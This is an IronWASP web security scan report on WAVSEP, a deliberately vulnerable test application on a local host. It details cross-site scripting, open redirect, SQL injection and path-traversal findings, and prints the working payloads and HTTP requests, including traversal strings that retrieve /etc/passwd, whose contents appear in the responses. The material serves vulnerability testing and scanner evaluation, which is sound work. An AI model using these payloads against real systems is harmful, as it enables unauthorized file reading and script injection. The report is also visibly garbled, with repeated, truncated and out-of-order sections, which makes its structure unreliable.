IronWASP Security Analysis Report
Report based on the analysis performed by the open source web security software, IronWASP
Overview
Index
http://192.168.1.75:8080/
Overview
This report contains the list of security findings discovered by IronWASP. The current section of the report gives a brief overview of the number of different findings, the numbers are categorized by the hosts they were discovered on.
The index section contains the names of all the findings. The sections after that show details of every individual finding.

The table below shows the number of findings discovered in each host. The findings are seperated based on their type and severity.


Legend:

High     High Severity Vulnerability
Medium     Medium Severity Vulnerability
Low     Low Severity Vulnerability
Info     Information Findings
Test Leads     Things of interest for manual testing

The High, Medium and Low severity vulnerability numbers are also split based on the confidence with which IronWASP has reported them.

  0      High Confidence                0      Medium Confidence                0      Low Confidence             

High Medium Low Info Test leads Total Hosts

Index

Parameter Location:Query
Description:
Cross-site Scripting was identified in the userinput parameter of the Query section of the scanned request.
The relevant parts of the requests/responses pairs associated with the check that discovered this issue are available below.

Description:
Cross-site Scripting was identified in the userinput parameter of the Query section of the scanned request.
The relevant parts of the requests/responses pairs associated with the check that discovered this issue are available below.
Request sent by Scanner:

The payload in this request tries to insert the string '//iczpbtsq' as executable JavaScript code inside CSS. The payload is */ @import '//iczpbtsq'; /*

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-New-Contexts-GET/Case13-Tag2CSSCommentScope.jsp?userinput=*%2f+%40import+'%2f%2ficzpbtsq'%3b+%2f* HTTP/1.1

Response from the Server:

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Date: Thu, 09 May 2024 18:52:24 GMT

</head>
<body>

a::after {
content: "_link";
}
</style>

</body>
</html>

Affected Parameter:userinput
Parameter Location:Query

Cross-site Scripting was identified in the userinput parameter of the Query section of the scanned request.

The payload in this request tries to insert the string 'iczpbtsq' as executable JavaScript code inside CSS. The payload is aa";} @import url(javascript:"iczpbtsq"); aa {aa:"aa

Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue



Response from the Server:

The string 'iczpbtsq' from the payload is found inside the CSS section of this response and it's exact position inside the CSS can lead to it being executed as JavaScript.

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1

Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/

Affected Parameter:userinput
Parameter Location:Query
Description:
Cross-site Scripting was identified in the userinput parameter of the Query section of the scanned request.
The relevant parts of the requests/responses pairs associated with the check that discovered this issue are available below.

Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-GET/Case02-Tag2TagScope.jsp?userinput=textvalue
Affected Parameter:userinput
Parameter Location:Query
Description:
Cross-site Scripting was identified in the userinput parameter of the Query section of the scanned request.
The relevant parts of the requests/responses pairs associated with the check that discovered this issue are available below.
Request sent by Scanner:

The payload in this request tries to inject an HTML tag named 'h' with attribute name 'xtx' and attribute value 'yty'. The payload is </textarea><h xtx=yty>

Parameter Location:Query

Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 482

</head>

</body>

[---- Snipped parts of HTTP headers section for brevity ----]

Response from the Server:

The string 'iczpbtsq' from the payload is found inside the CSS section of this response and it's exact position inside the CSS can lead to it being executed as JavaScript.

Request sent by Scanner:

The payload in this request tries to inject an HTML tag named 'h' with attribute name 'xsx' and attribute value 'ysy'. The payload is </style><h xsx=ysy>

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-New-Contexts-POST/Case12-Tag2CSSQuotedStringScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=%3c%2fstyle%3e%3ch+xsx%3dysy%3e

Response from the Server:

This response contains an HTML tag named 'h' with attribute name 'xsx' and attribute value 'ysy'. This was inserted by the payload.

HTTP/1.1 200

Content-Length: 1956

</body>
</html>

Open Redirect Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/DOM-XSS/DXSS-Detection-Evaluation-GET-Experimental/Case02-InjectionDirectlyInToDomXssSinkLocation.jsp?userinput=textvalue
Affected Parameter:userinput
Parameter Location:Query
Description:
Open redirect was identified in the userinput parameter of the Query section of the scanned request.

Open Redirect is an issue where it is possible to redirect the user to any arbitrary website from the vulnerable site. For more details on this issue refer http://cwe.mitre.org/data/definitions/601.html

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent http://example.org as payload to the application. The response that came back from the application to this payload had the value http://example.org inside JavaScript of the page in such a way that it would cause a redirection to this value.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can manually send this payload from the browser and observe is the page is actually being redirect outside. If the browser does not perform a redirect then observe the HTML source of the page and try to identify why the page does not redirect inspite of the payload URL occurring in a section of the page that would trigger a redirect.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request contains an url to the domain example.org. The payload is http://example.org

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/DOM-XSS/DXSS-Detection-Evaluation-GET-Experimental/Case02-InjectionDirectlyInToDomXssSinkLocation.jsp?userinput=http%3a%2f%2fexample.org HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue



Response from the Server:

This response contains a redirect to the domain example.org in its JavaScript code. This redirect has been caused by the payload.

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 353

[---- Snipped parts of HTTP body section for brevity ----]t="text/html; charset=ISO-8859-1">
<title>JavaScript Injection in DOM XSS Sink document.location</title>
</head>
<body>

<script>
document.location= "http://example.org";</script>


</body>
</html>
Open Redirect Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Unvalidated-Redirect/Redirect-JavaScript-Detection-Evaluation-GET-200Valid/Case01-Redirect-RedirectMethod-FilenameContext-Unrestricted-HttpURL-DefaultFullInput-AnyPathReq-Read.jsp?target=http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Unvalidated-Redirect/Redirect-JavaScript-Detection-Evaluation-GET-200Valid/default.txt
Affected Parameter:target
Parameter Location:Query
Description:
Open redirect was identified in the target parameter of the Query section of the scanned request.

Open Redirect is an issue where it is possible to redirect the user to any arbitrary website from the vulnerable site. For more details on this issue refer http://cwe.mitre.org/data/definitions/601.html

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent http://example.org as payload to the application. The response that came back from the application to this payload had the value http://example.org inside JavaScript of the page in such a way that it would cause a redirection to this value.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can manually send this payload from the browser and observe is the page is actually being redirect outside. If the browser does not perform a redirect then observe the HTML source of the page and try to identify why the page does not redirect inspite of the payload URL occurring in a section of the page that would trigger a redirect.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.

SQL Injection Detected
<<<>>>
Type:Vulnerability
Severity:High
Confidence:Medium
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case08-Event2SingleQuotePropertyScope.jsp
Affected Parameter:userinput
Parameter Location:Body
Description:
SQL Injection was identified in the userinput parameter of the Body section of the scanned request.

SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer https://www.owasp.org/index.php/SQL_Injection

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent three payloads to the application with SQL code snippets in them.
Payload A - y'||'yyyy
Payload B - y'+'yyyy
Payload C - y' 'yyyy
Payload A is trying to concatenate two strings as per the SQL syntax of Oracle database servers. Payload B is trying to concatenate the same two strings as per SQL syntax of MS SQL database servers. Payload C is trying to concatenate the same two strings as per the SQL syntax of MySQL database servers.
The response for Payload B and C were similar to each other and is different from the response received for Payloads A. This indicates that the application was actually trying to perform the string concatenation on the server-side and that the backend database in use is Oracle. Since incase of Oracle database server Payloads B & C would have simply thrown an invalid SQL syntax exception their responses are similar. And Payload A would have executed without this error and so its response was different than the other two.
If the application was not actually performing the concatenation then all three payload should have received very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
False Positive Check Assistance:
Manually analyze the responses received for the three payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with different strings and check if this behaviour is repeated.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request tries to concatenate two strings as per Oracle database's syntax. The payload is y'||'yyyy

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case08-Event2SingleQuotePropertyScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=y'%7c%7c'yyyy

Information about the Response from the Server:

This response is different from the responses recieved for the payloads that used MS SQL and MySQL databases' concatenation syntax.

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MS SQL database's syntax. The payload is y'+'yyyy

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case08-Event2SingleQuotePropertyScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=y'%2b'yyyy

Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MySQL database's concatenation syntax

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MySQL database's syntax. The payload is y' 'yyyy

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case08-Event2SingleQuotePropertyScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=y'+'yyyy

Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MS SQL database's concatenation syntax

SQL Injection Detected
<<<>>>
Type:Vulnerability
Severity:High
Confidence:Medium
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case07-Event2DoubleQuotePropertyScope.jsp
Affected Parameter:userinput
Parameter Location:Body
Description:
SQL Injection was identified in the userinput parameter of the Body section of the scanned request.

SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer https://www.owasp.org/index.php/SQL_Injection

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent three payloads to the application with SQL code snippets in them.
Payload A - y"||"yyyy
Payload B - y"+"yyyy
Payload C - y" "yyyy
Payload A is trying to concatenate two strings as per the SQL syntax of Oracle database servers. Payload B is trying to concatenate the same two strings as per SQL syntax of MS SQL database servers. Payload C is trying to concatenate the same two strings as per the SQL syntax of MySQL database servers.
The response for Payload B and C were similar to each other and is different from the response received for Payloads A. This indicates that the application was actually trying to perform the string concatenation on the server-side and that the backend database in use is Oracle. Since incase of Oracle database server Payloads B & C would have simply thrown an invalid SQL syntax exception their responses are similar. And Payload A would have executed without this error and so its response was different than the other two.
If the application was not actually performing the concatenation then all three payload should have received very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
False Positive Check Assistance:
Manually analyze the responses received for the three payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with different strings and check if this behaviour is repeated.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request tries to concatenate two strings as per Oracle database's syntax. The payload is y"||"yyyy

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case07-Event2DoubleQuotePropertyScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=y%22%7c%7c%22yyyy

Information about the Response from the Server:

This response is different from the responses recieved for the payloads that used MS SQL and MySQL databases' concatenation syntax.

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MS SQL database's syntax. The payload is y"+"yyyy

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case07-Event2DoubleQuotePropertyScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=y%22%2b%22yyyy

Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MySQL database's concatenation syntax

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MySQL database's syntax. The payload is y" "yyyy

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-Detection-Evaluation-POST/Case07-Event2DoubleQuotePropertyScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=y%22+%22yyyy

Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MS SQL database's concatenation syntax

SQL Injection Detected
<<<>>>
Type:Vulnerability
Severity:High
Confidence:Medium
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-New-Contexts-POST/Case02-Tag2HtmlEventAttributeValueQuotelessScope.jsp
Affected Parameter:userinput
Parameter Location:Body
Description:
SQL Injection was identified in the userinput parameter of the Body section of the scanned request.

SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer https://www.owasp.org/index.php/SQL_Injection

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent three payloads to the application with SQL code snippets in them.
Payload A - g'||'g
Payload B - g'+'g
Payload C - g' 'g
Payload A is trying to concatenate two strings as per the SQL syntax of Oracle database servers. Payload B is trying to concatenate the same two strings as per SQL syntax of MS SQL database servers. Payload C is trying to concatenate the same two strings as per the SQL syntax of MySQL database servers.
The response for Payload B and C were similar to each other and is different from the response received for Payloads A. This indicates that the application was actually trying to perform the string concatenation on the server-side and that the backend database in use is Oracle. Since incase of Oracle database server Payloads B & C would have simply thrown an invalid SQL syntax exception their responses are similar. And Payload A would have executed without this error and so its response was different than the other two.
If the application was not actually performing the concatenation then all three payload should have received very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
False Positive Check Assistance:
Manually analyze the responses received for the three payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with different strings and check if this behaviour is repeated.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request tries to concatenate two strings as per Oracle database's syntax. The payload is g'||'g

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-New-Contexts-POST/Case02-Tag2HtmlEventAttributeValueQuotelessScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=g'%7c%7c'g

Information about the Response from the Server:

This response is different from the responses recieved for the payloads that used MS SQL and MySQL databases' concatenation syntax.

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MS SQL database's syntax. The payload is g'+'g

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-New-Contexts-POST/Case02-Tag2HtmlEventAttributeValueQuotelessScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=5673C746F159BC10414DF759321C443F;userinput=EmptyValue

userinput=g'%2b'g

Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MySQL database's concatenation syntax

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MySQL database's syntax. The payload is g' 'g

POST http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-New-Contexts-POST/Case02-Tag2HtmlEventAttributeValueQuotelessScope.jsp HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]

userinput=g'+'g

Information about the Response from the Server:

Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-FalsePositives-GET/Case04-SingleQuotesEqualityAndBracketsEncodingInProperty.jsp?userinput=abcd
Affected Parameter:userinput
Parameter Location:Query
Description:
SQL Injection was identified in the userinput parameter of the Query section of the scanned request.

SQL Injection is an issue where it is possible execute SQL queries on the database being used on the server-side. For more details on this issue refer https://www.owasp.org/index.php/SQL_Injection

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent three payloads to the application with SQL code snippets in them.
Payload A - a'||'bcd
Payload B - a'+'bcd
Payload C - a' 'bcd
Payload A is trying to concatenate two strings as per the SQL syntax of Oracle database servers. Payload B is trying to concatenate the same two strings as per SQL syntax of MS SQL database servers. Payload C is trying to concatenate the same two strings as per the SQL syntax of MySQL database servers.
The response for Payload B and C were similar to each other and is different from the response received for Payloads A. This indicates that the application was actually trying to perform the string concatenation on the server-side and that the backend database in use is Oracle. Since incase of Oracle database server Payloads B & C would have simply thrown an invalid SQL syntax exception their responses are similar. And Payload A would have executed without this error and so its response was different than the other two.
If the application was not actually performing the concatenation then all three payload should have received very similar responses. Therefore this indicates that SQL syntax from the payload is executed as part of the SQL query on the server.
False Positive Check Assistance:
Manually analyze the responses received for the three payloads and confirm if the type of similarity explained above actually exists in them. Try resending the same payloads again but with different strings and check if this behaviour is repeated.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request tries to concatenate two strings as per Oracle database's syntax. The payload is a'||'bcd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-FalsePositives-GET/Case04-SingleQuotesEqualityAndBracketsEncodingInProperty.jsp?userinput=a'%7c%7c'bcd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=0D4EE32E0B6AB424F642558930FC6219



Information about the Response from the Server:

This response is different from the responses recieved for the payloads that used MS SQL and MySQL databases' concatenation syntax.

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MS SQL database's syntax. The payload is a'+'bcd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-FalsePositives-GET/Case04-SingleQuotesEqualityAndBracketsEncodingInProperty.jsp?userinput=a'%2b'bcd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=0D4EE32E0B6AB424F642558930FC6219



Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MySQL database's concatenation syntax

Request sent by Scanner:

The payload in this request tries to concatenate two strings as per MySQL database's syntax. The payload is a' 'bcd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/Reflected-XSS/RXSS-FalsePositives-GET/Case04-SingleQuotesEqualityAndBracketsEncodingInProperty.jsp?userinput=a'+'bcd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=0D4EE32E0B6AB424F642558930FC6219



Information about the Response from the Server:

This response is different from the response recieved for the payloads that used Oracle database's concatenation syntax but similar to the response for the payload that used MS SQL database's concatenation syntax

Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp?target=none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case03-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultRelativeInput-AnyPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: 192.168.1.75:8080
[---- Snipped parts of HTTP headers section for brevity ----]
Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case04-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultRelativeInput-AnyPathReq-Read.jsp?target=file://passwd
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.txt as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:!:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is file:/aaa../../../../../../../../../../../../../../../etc/passwd\0.txt

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case04-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultRelativeInput-AnyPathReq-Read.jsp?target=file%3a%2faaa..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00.txt HTTP/1.1

----- START OF INTERESTING TEXT -----
root:!:x:0:0:
----- END OF INTERESTING TEXT -----

After that you can try changing the file name to something else and see if the server prints those file contents.

Cookie: JSESSIONID=9BB9D8407A9DDB2452FD7CDAA4C1561B



Response from the Server:

This response contains contents of the etc/passwd file. This was caused by the payload

HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
[---- Snipped parts of HTTP headers section for brevity ----]
Content-Length: 3171

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync[---- Snipped parts of HTTP body section for brevity ----]
Local File Include Found
<<<>>>
Type:Vulnerability
Severity:High
Confidence:High
Found By:Active Scanning

Affected Site:http://192.168.1.75:8080/
Affected Url:/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case11-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-NoPathReq-Read.jsp?target=none892j3kd.txt
Affected Parameter:target
Parameter Location:Query
Description:
Local File Include/Path Traversal was identified in the target parameter of the Query section of the scanned request.

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reason:
Reason:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.
The relevant parts of the requests/responses pairs associated with the check explained in this reason section are available below.
Request sent by Scanner:

The payload in this request refers to the etc/passwd file by traversing upwards in the directory structure. The payload is /../../../../../../../../../../../../../../../etc/passwd

GET http://192.168.1.75:8080/wavsep-enhancement-1.8.1-SNAPSHOT/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case11-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-NoPathReq-Read.jsp?target=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1

Local File Include is an issue where it is possible to load and view the raw contents of any files present on the web server. For more details on this issue refer https://www.owasp.org/index.php/Path_Traversal

Reasons:
IronWASP has reported this issue because of the following reasons:
Reason 1:
IronWASP sent /../../../../../../../../../../../../../../../etc/passwd\0 as payload to the application. This payload tries to refer to the file etc/passwd by traversing from the current directory with a series of ../. If the application is vulnerable it will load the etc/passwd file and send its contents in the response. The response that came back from the application after the payload was injected had the text root:x:0:0:, which is usually found in etc/passwd files. This indicates that the etc/passwd file was loaded and its content printed in the response.
False Positive Check Assistance:
To check if this was a valid case or a false positive you can first manually look at the response sent for this payload and determine if it actually contains the contents of the etc/passwd file. After that you can try changing the file name to something else and see if the server prints those file contents.
If you discover that this issue was a false positive then please consider reporting this to lava@ironwasp.org. Your feedback will help improve the accuracy of the scanner.

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
